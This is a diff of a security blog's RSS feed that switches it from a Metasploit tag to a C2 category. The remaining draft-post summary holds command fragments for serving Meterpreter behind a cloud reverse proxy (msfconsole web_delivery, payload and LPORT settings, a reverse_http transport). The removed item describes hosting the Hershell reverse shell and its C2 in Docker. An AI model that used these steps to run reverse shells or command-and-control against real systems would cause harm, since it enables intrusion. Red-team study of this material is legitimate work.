@@ -1,14 +1,14 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>metasploit on khast3x blog</title>
-    <link>https://khast3x.club/tags/metasploit/</link>
-    <description>Recent content in metasploit on khast3x blog</description>
+    <title>c2 on khast3x blog</title>
+    <link>https://khast3x.club/categories/c2/</link>
+    <description>Recent content in c2 on khast3x blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Wed, 29 Jan 2020 00:00:00 +0000</lastBuildDate>
     
-	<atom:link href="https://khast3x.club/tags/metasploit/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://khast3x.club/categories/c2/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
@@ -29,17 +29,6 @@ What are we doing We&amp;rsquo;re going to use Traefik as a reverse proxy to Met
       
       <guid>https://khast3x.club/posts/DRAFT-2020-Serving-Meterpreter-Cloud/</guid>
       <description>Traefik Done - Reverse http+tcp  Use the docker-compose.yml method to deploy Defining each service attached to each definition solved the multi service error Want to try with tcp This Doc page with more details on making rules/chaning them here Securing the docker host exposing the the api here Test staged payload  How to run  docker-compose up [new connection] docker exec -it msfconsole /bin/bash ./msfconsole -r web_delivery.rc &amp;gt; run OR  for TCP set payload 10 + set LPORT 8888 + run    transport add -t reverse_http -u handler -l 163.</description>
-    </item>
-    
-    <item>
-      <title>Cloud reverse-shell: Hershell, Metasploit and Docker</title>
-      <link>https://khast3x.club/posts/2018-10-02-docker-c2-hershell-metasploit/</link>
-      <pubDate>Tue, 02 Oct 2018 00:00:00 +0000</pubDate>
-      
-      <guid>https://khast3x.club/posts/2018-10-02-docker-c2-hershell-metasploit/</guid>
-      <description>&lt;hr&gt;
-&lt;p&gt;In the following article we&amp;rsquo;ll be deploying Hershell, a minimal golang reverse shell, and its C2 using Docker to host it on a cloud provider&amp;rsquo;s infrastructure.&lt;br&gt;
-One of the many powers of golang is it&amp;rsquo;s cross platform capabilities. Since the codebase is minimal, we&amp;rsquo;ll see how to use a container to host our C2.&lt;/p&gt;</description>
     </item>
     
   </channel>
